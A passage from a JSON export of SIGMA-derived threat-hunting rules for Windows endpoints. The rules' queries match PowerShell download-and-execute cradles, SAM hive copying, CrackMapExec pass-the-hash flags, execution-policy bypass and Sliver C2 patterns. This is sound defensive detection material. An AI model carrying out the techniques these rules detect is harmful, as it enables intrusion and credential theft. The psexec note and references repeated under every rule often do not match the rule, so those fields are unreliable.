            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"\\ShellIds\\Microsoft.PowerShell\\ExecutionPolicy\" or tgt.process.cmdline contains \"\\Policies\\Microsoft\\Windows\\PowerShell\\ExecutionPolicy\") and (tgt.process.cmdline contains \"Bypass\" or tgt.process.cmdline contains \"RemoteSigned\" or tgt.process.cmdline contains \"Unrestricted\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1047
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects code execution via Pester.bat (Pester - Powershell Modulte for testing)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059",
                "t1216"
            ],
            "name": "Execute Code with Pester.bat as Parent",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((src.process.image.path contains \"\\powershell.exe\" or src.process.image.path contains \"\\pwsh.exe\") and src.process.cmdline contains \"\\WindowsPowerShell\\Modules\\Pester\\\") and (src.process.cmdline contains \"{ Invoke-Pester -EnableExit ;\" or src.process.cmdline contains \"{ Get-Help \\\"\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1048
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects process activity patterns as seen being used by Sliver C2 framework implants",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "HackTool - Sliver C2 Implant Activity Pattern",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.cmdline contains \"-NoExit -Command [Console]::OutputEncoding=[Text.UTF8Encoding]::UTF8\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1049
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of powershell, a WebClient object creation and the invocation of DownloadFile in a single command line",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059",
                "t1104",
                "t1105"
            ],
            "name": "PowerShell DownloadFile",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"powershell\" and tgt.process.cmdline contains \".DownloadFile\" and tgt.process.cmdline contains \"System.Net.WebClient\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1050
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of \"BitLockerToGo.EXE\".\nBitLocker To Go is BitLocker Drive Encryption on removable data drives. This feature includes the encryption of, USB flash drives, SD cards, External hard disk drives, Other drives that are formatted by using the NTFS, FAT16, FAT32, or exFAT file system.\nThis is a rarely used application and usage of it at all is worth investigating.\nMalware such as Lumma stealer has been seen using this process as a target for process hollowing.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "BitLockerTogo.EXE Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.image.path contains \"\\BitLockerToGo.exe\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1051
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious Windows Error Reporting manager (wermgr.exe) execution location.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Suspicious Execution Location Of Wermgr.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\wermgr.exe\" and (not (tgt.process.image.path contains \"C:\\Windows\\System32\\\" or tgt.process.image.path contains \"C:\\Windows\\SysWOW64\\\" or tgt.process.image.path contains \"C:\\Windows\\WinSxS\\\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1052
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Executes arbitrary PowerShell code using SyncAppvPublishingServer.vbs",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218",
                "t1216"
            ],
            "name": "SyncAppvPublishingServer VBS Execute Arbitrary PowerShell Code",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"\\SyncAppvPublishingServer.vbs\" and tgt.process.cmdline contains \";\")) | columns ComputerName,tgt.process.user,tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1053
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "This rule detect common flag combinations used by CrackMapExec in order to detect its use even if the binary has been replaced.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1047",
                "t1053",
                "t1059",
                "t1059",
                "t1110",
                "t1201"
            ],
            "name": "HackTool - CrackMapExec Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\crackmapexec.exe\" or tgt.process.cmdline contains \" -M pe_inject \" or (tgt.process.cmdline contains \" --local-auth\" and tgt.process.cmdline contains \" -u \" and tgt.process.cmdline contains \" -x \") or (tgt.process.cmdline contains \" --local-auth\" and tgt.process.cmdline contains \" -u \" and tgt.process.cmdline contains \" -p \" and tgt.process.cmdline contains \" -H 'NTHASH'\") or (tgt.process.cmdline contains \" mssql \" and tgt.process.cmdline contains \" -u \" and tgt.process.cmdline contains \" -p \" and tgt.process.cmdline contains \" -M \" and tgt.process.cmdline contains \" -d \") or (tgt.process.cmdline contains \" smb \" and tgt.process.cmdline contains \" -u \" and tgt.process.cmdline contains \" -H \" and tgt.process.cmdline contains \" -M \" and tgt.process.cmdline contains \" -o \") or (tgt.process.cmdline contains \" smb \" and tgt.process.cmdline contains \" -u \" and tgt.process.cmdline contains \" -p \" and tgt.process.cmdline contains \" --local-auth\")) or ((tgt.process.cmdline contains \" --local-auth\" and tgt.process.cmdline contains \" -u \" and tgt.process.cmdline contains \" -p \") and (tgt.process.cmdline contains \" 10.\" and tgt.process.cmdline contains \" 192.168.\" and tgt.process.cmdline contains \"/24 \")))) | columns ComputerName,tgt.process.user,tgt.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1054
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious ways to download files or content using PowerShell",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059",
                "t1105"
            ],
            "name": "PowerShell Web Download",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \".DownloadString(\" or tgt.process.cmdline contains \".DownloadFile(\" or tgt.process.cmdline contains \"Invoke-WebRequest \" or tgt.process.cmdline contains \"iwr \"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1055
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of chromium based browser in headless mode using the \"dump-dom\" command line to download files",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1105"
            ],
            "name": "File Download with Headless Browser",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\brave.exe\" or tgt.process.image.path contains \"\\chrome.exe\" or tgt.process.image.path contains \"\\msedge.exe\" or tgt.process.image.path contains \"\\opera.exe\" or tgt.process.image.path contains \"\\vivaldi.exe\") and (tgt.process.cmdline contains \"--headless\" and tgt.process.cmdline contains \"dump-dom\" and tgt.process.cmdline contains \"http\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1056
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects \"svchost.exe\" spawning \"rundll32.exe\" with command arguments like C:\\windows\\system32\\davclnt.dll,DavSetCookie. This could be an indicator of exfiltration or use of WebDav to launch code (hosted on WebDav Server) or potentially a sign of exploitation of CVE-2023-23397\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1048"
            ],
            "name": "Suspicious WebDav Client Execution Via Rundll32.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"\\svchost.exe\" and src.process.cmdline contains \"-s WebClient\" and tgt.process.image.path contains \"\\rundll32.exe\" and tgt.process.cmdline contains \"C:\\windows\\system32\\davclnt.dll,DavSetCookie\" and tgt.process.cmdline matches \"://\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}\") and (not (tgt.process.cmdline contains \"://10.\" or tgt.process.cmdline contains \"://192.168.\" or tgt.process.cmdline contains \"://172.16.\" or tgt.process.cmdline contains \"://172.17.\" or tgt.process.cmdline contains \"://172.18.\" or tgt.process.cmdline contains \"://172.19.\" or tgt.process.cmdline contains \"://172.20.\" or tgt.process.cmdline contains \"://172.21.\" or tgt.process.cmdline contains \"://172.22.\" or tgt.process.cmdline contains \"://172.23.\" or tgt.process.cmdline contains \"://172.24.\" or tgt.process.cmdline contains \"://172.25.\" or tgt.process.cmdline contains \"://172.26.\" or tgt.process.cmdline contains \"://172.27.\" or tgt.process.cmdline contains \"://172.28.\" or tgt.process.cmdline contains \"://172.29.\" or tgt.process.cmdline contains \"://172.30.\" or tgt.process.cmdline contains \"://172.31.\" or tgt.process.cmdline contains \"://127.\" or tgt.process.cmdline contains \"://169.254.\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1057
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects PowerShell download and execution cradles.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "PowerShell Download and Execution Cradles",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \".DownloadString(\" or tgt.process.cmdline contains \".DownloadFile(\" or tgt.process.cmdline contains \"Invoke-WebRequest \" or tgt.process.cmdline contains \"iwr \") and (tgt.process.cmdline contains \";iex $\" or tgt.process.cmdline contains \"| IEX\" or tgt.process.cmdline contains \"|IEX \" or tgt.process.cmdline contains \"I`E`X\" or tgt.process.cmdline contains \"I`EX\" or tgt.process.cmdline contains \"IE`X\" or tgt.process.cmdline contains \"iex \" or tgt.process.cmdline contains \"IEX (\" or tgt.process.cmdline contains \"IEX(\" or tgt.process.cmdline contains \"Invoke-Expression\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1058
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects child processes of the \"Trace log generation tool for Media Foundation Tools\" (Mftrace.exe) which can abused to execute arbitrary binaries.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1127"
            ],
            "name": "Potential Mftrace.EXE Abuse",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and src.process.image.path contains \"\\mftrace.exe\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1059
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects changes to the \"NoLMHash\" registry value in order to allow Windows to store LM Hashes.\nBy setting this registry value to \"0\" (DWORD), Windows will be allowed to store a LAN manager hash of your password in Active Directory and local SAM databases.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1112"
            ],
            "name": "Enable LM Hash Storage - ProcCreation",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"\\System\\CurrentControlSet\\Control\\Lsa\" and tgt.process.cmdline contains \"NoLMHash\" and tgt.process.cmdline contains \" 0\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1060
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious PowerShell scripts accessing SAM hives",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1003"
            ],
            "name": "PowerShell SAM Copy",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"\\HarddiskVolumeShadowCopy\" and tgt.process.cmdline contains \"System32\\config\\sam\") and (tgt.process.cmdline contains \"Copy-Item\" or tgt.process.cmdline contains \"cp $_.\" or tgt.process.cmdline contains \"cpi $_.\" or tgt.process.cmdline contains \"copy $_.\" or tgt.process.cmdline contains \".File]::Copy(\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1061
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a potentially suspicious execution from an uncommon folder.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1036"
            ],
            "name": "Process Execution From A Potentially Suspicious Folder",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \":\\Perflogs\\\" or tgt.process.image.path contains \":\\Users\\All Users\\\" or tgt.process.image.path contains \":\\Users\\Default\\\" or tgt.process.image.path contains \":\\Users\\NetworkService\\\" or tgt.process.image.path contains \":\\Windows\\addins\\\" or tgt.process.image.path contains \":\\Windows\\debug\\\" or tgt.process.image.path contains \":\\Windows\\Fonts\\\" or tgt.process.image.path contains \":\\Windows\\Help\\\" or tgt.process.image.path contains \":\\Windows\\IME\\\" or tgt.process.image.path contains \":\\Windows\\Media\\\" or tgt.process.image.path contains \":\\Windows\\repair\\\" or tgt.process.image.path contains \":\\Windows\\security\\\" or tgt.process.image.path contains \":\\Windows\\System32\\Tasks\\\" or tgt.process.image.path contains \":\\Windows\\Tasks\\\" or tgt.process.image.path contains \"$Recycle.bin\" or tgt.process.image.path contains \"\\config\\systemprofile\\\" or tgt.process.image.path contains \"\\Intel\\Logs\\\" or tgt.process.image.path contains \"\\RSA\\MachineKeys\\\") and (not (tgt.process.image.path contains \"C:\\Users\\Public\\IBM\\ClientSolutions\\Start_Programs\\\" or (tgt.process.image.path contains \"C:\\Windows\\SysWOW64\\config\\systemprofile\\Citrix\\UpdaterBinaries\\\" and tgt.process.image.path contains \"\\CitrixReceiverUpdater.exe\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1062
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "ZipExec is a Proof-of-Concept (POC) tool to wrap binary-based tools into a password-protected zip file.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218",
                "t1202"
            ],
            "name": "Suspicious ZipExec Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
